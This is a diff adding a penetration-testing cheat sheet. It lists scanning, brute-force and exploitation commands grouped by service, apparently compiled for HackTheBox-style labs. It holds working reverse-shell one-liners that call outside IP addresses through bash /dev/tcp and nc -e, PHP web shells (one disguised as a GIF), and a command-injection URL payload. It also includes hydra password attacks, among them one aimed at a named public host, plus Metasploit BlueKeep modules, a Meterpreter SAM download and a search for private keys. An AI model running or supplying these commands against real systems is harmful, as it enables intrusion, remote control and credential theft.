@@ -1,0 +1,229 @@
+Linux
+echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" | sudo tee /etc/apt/sources.list
+apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6
+apt-get -y update && apt-get -y -f upgrade && apt-get -y full-upgrade && apt-get -y -f  install kali-linux-everything
+
+Port Scanner
+nmap -A $URL -v
+nmap -F $URL -v
+nmap -F -iL scan --open
+naabu -host $URL -v
+masscan -p1-65535 $CIDR
+masscan -p443 $CIDR
+masscan -p80 $CIDR
+rustscan -a $URL
+
+Subdomains
+nmap --script dns-brute --script-args dns-brute.domain=$URL,dns-brute.threads=6 -v -oN scan
+subfinder -d $URL -v
+subfinder -silent -d $URL | dnsx -silent
+assetfinder -subs-only $URL
+amass enum -d $URL -v
+
+Directory Scanner
+gobuster dir -u $URL -w /usr/share/wordlists/seclists/ -b 301,404,400,500
+dirsearch -u $URL -x 301,404,400,500,429 -w /usr/share/wordlists/seclists/
+gospider -s https://$URL --other-source -o /
+nmap -sV --script=http-enum $URL -v 
+
+DNS
+nslookup -type=any $URL 8.8.8.8
+dnsrecon -d $URL -t axfr
+dnsrecon -d $URL -D /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t brt
+
+Reverse Shell
+python3 -m http.server 80
+python -m SimpleHTTPServer 80
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import os; os.system("/bin/bash")'
+http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"`'}
+$URL/shell.php?cmd=ls
+echo '<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"); ?>' - shell.php
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+echo '<?php system($_GET["cmd"]); ?>' | base64
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+nc -lvnp 444
+nc -e /bin/sh 147.182.232.224 444
+bash -i >& /dev/tcp/147.182.232.224/444 0>&1
+nc -nlvp 1234
+exec bash -c 'bash -i >& /dev/tcp/10.10.14.93/1234 0>&1'
+nc -nv 10.129.41.200 7777 - Client Request
+nc -lvnp 7777 - Server Listener
+
+HTTPx
+httpx https://$URL | grep http
+httpx https://$URL --follow-redirects
+httpx -m OPTIONS https://$URL
+
+cURL
+curl -vvv https://$URL
+curl -s http://$URL -X POST -d "q=143.198.52.11"
+curl -F logo=@filename [URL]
+curl -i -X OPTIONS $URL
+curl -IL $URL
+
+Web Technology
+whatweb $URL
+whatweb https://$URL
+whatweb http://$URL
+
+SMB
+smbclient –L \\$URL –U guest
+smbmap -H $URL -u guest -R
+nmblookup -A $URL
+enum4linux -S $URL
+nmap --script smb-brute.nse -p445 $URL
+crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
+hydra -L /usr/share/wordlists/ -P  /usr/share/wordlists/ smb://10.129.42.197
+
+SSH
+hydra -L /usr/share/wordlist/ -p /usr/share/wordlist/ $URL ssh
+hydra -t 16 -L /usr/share/wordlists/ -P /usr/share/wordlists/rockvou.txt -V $URL ssh
+
+RPC
+rpcdump -p 111 $URL
+rpcclient -U "" $URL
+
+RDP
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+SQLMap
+sqlmap -r sqlfile –dbs --batch
+sqlmap -u $URL --batch
+sqlmap -u $URL/sqli/Less-1/?id=1 --dbs --batch
+
+Ncrack
+ncrack -U /usr/share/wordlists/ -P /usr/share/wordlists/ http://192.168.0.105
+
+Medusa
+medusa -h 192.168.0.105 -U /usr/share/wordlists/ -P /usr/share/wordlists/ -M http -f
+
+FTP
+ftp $URL anonymous
+ftp://anonymous:anonymous@$URL
+hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f blog.symbaloo.com ftp
+
+IPtables
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+
+POP3
+hydra -L /usr/share/wordlists/ -P /usr/share/wordlists/ -f $URL pop3 -V
+
+LDAP 
+ldapsearch -H ldap://$URL -x -LLL -s sub -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
+
+Telnet
+telnet $URL 80
+GET /HTTP/2
+Host: $URL
+Accept: text/html
+
+SSH Keys
+cat /root/.ssh/authorized\_keys
+cat /root/.ssh/identity.pub
+grep -ir "BEGIN RSA PRIVATE KEY" /*
+
+AWS
+aws configure
+aws --endpoint=$URL s3 cp shell.php s3://thetoppers.htb
+
+MySQL
+mysql -u root -p
+mysql -u root -h docker.hackthebox.eu -P 3306 -p 
+SHOW TABLES
+
+WPScan
+wpscan --url $URL/wordpress/ -U /usr/share/wordlists/ -P /usr/share/wordlists/rockyou.txt
+wpscan --url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
+
+Zip
+fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
+
+Decode Linux
+echo KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB4== | base64 -d
+echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r
+echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+echo '<?php system($_GET["cmd"]); ?>' | base64
+
+VNC
+vncviewer 192.168.1.46:4455
+
+Amass
+amass intel -d $URL -whois
+amass enum -d $URL -v
+
+John The Ripper
+gpg2john key > hash
+john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt.gz hash.txt
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --format=sha256 hash.txt
+
+Hakrawler
+echo https://$URL | hakrawler
+echo https://$URL | hakrawler -proxy http://localhost:8080
+
+Hash
+hashes.com
+hashcat -a 0 -m <hash type> <hash file> <wordlist>
+hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+hashcat -m 0 -a 1 Hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/combinator.rule
+hashid -m '$1$VnG/6ABB$t6w9bQFxvI9tf0sFJf2TR.'
+hashid 'a2d1f7b7a1862d0d4a52644e72d59df5:500:lp@trash-mail.com'
+
+Metasploit
+ls /usr/share/metasploit-framework/modules
+use exploit/multi/script/web_delivery
+use auxiliary/scanner/http/http_login
+use auxiliary/gather/kerberos_enumusers
+use auxiliary/scanner/ftp/ftp_login
+
+Meterpreter Commands
+upload file c:\\windows
+download c:\\windows\\repair\\sam /tmp
+getsystem, ps
+shell
+
+WAF
+wafw00f $URL
+
+Telnet
+telnet 192.168.0.11 21
+nc 192.168.0.11 21
+
+MacOS
+networksetup -listallhardwareports
+networksetup -setairportnetwork en0 WIFI_SSID WIFI_PASSWORD
+scutil --nwi
+gping 8.8.8.8
+networksetup -getinfo Wi-Fi
+networkQuality -I en0
+security find-generic-password -wa IZZI-1A94
+xcrun sifctl delete unavailable
+defaults write com.apple.finder AppleShowAllFiles true
+pmset -g batt | egrep "([0-9]+\%).*" -o --colour=auto | cut -f3 -d';'
+
+Windows Tools
+whoami
+rdesktop 192.168.1.41:3314
+
+Nikto
+nikto --host $URL
+
+Nuclei 
+nuclei -u $URL
+
+Web Javascript
+document.URL
+document.cookie
+location.href
+localStorage
+sessionStorage
+
+SNMP
+snmpget -v 1 -c public $URL .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+
+SMTP
+nmap $URL -p 25 --script banner,smtp-commands
+hydra -P /usr/share/wordlists $URL smtp -V
